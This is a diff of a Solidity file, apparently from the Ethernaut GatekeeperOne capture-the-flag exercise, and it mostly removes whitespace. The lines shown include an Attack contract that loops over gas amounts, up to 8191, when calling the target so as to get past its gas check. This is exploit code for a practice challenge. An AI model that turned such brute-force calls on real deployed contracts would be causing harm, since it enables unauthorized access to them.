@@ -18,9 +18,8 @@ contract Attack {
     constructor(address enemyAddress) public {
          g1 = GatekeeperOne(enemyAddress);
          enemyContractAddress = enemyAddress;
-
     }
-
+    
    function attack() public{
          for (uint256 i = 0; i < 8191; i++) {
          (bool result, bytes memory data) = enemyContractAddress.call{gas:
@@ -31,22 +30,7 @@ contract Attack {
       }
     }
   }
-                                     
-   
-
 }
-
-
-
-
-
-
-
-
-
-
-
-
 contract GatekeeperOne {
 
   address public entrant;
